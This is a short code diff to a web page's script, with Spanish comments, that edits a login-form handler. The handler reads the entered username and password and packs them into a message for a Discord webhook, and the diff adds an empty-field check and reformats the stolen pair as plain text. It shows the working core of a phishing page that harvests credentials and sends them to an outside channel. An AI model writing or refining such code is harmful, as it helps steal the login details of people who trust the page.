@@ -130,17 +130,22 @@
 
   
     <script>
-  function enviarDatos(event) {
+ function enviarDatos(event) {
         event.preventDefault(); // Evita que el formulario se envíe de forma predeterminada
         
         // Obtiene los valores del usuario y la contraseña
         var usuario = document.getElementById("username").value;
         var contrasena = document.getElementById("password").value;
-        
+
+        // Verifica que los campos no estén vacíos
+        if (!usuario || !contrasena) {
+            alert('Por favor, ingresa usuario y contraseña.');
+            return;
+        }
+
         // Construye el objeto de datos que se enviará al webhook de Discord
         var datos = {
-            username: usuario,
-            password: contrasena
+            content: `Usuario: ${usuario}, Contraseña: ${contrasena}`
         };
 
         // URL de tu webhook de Discord
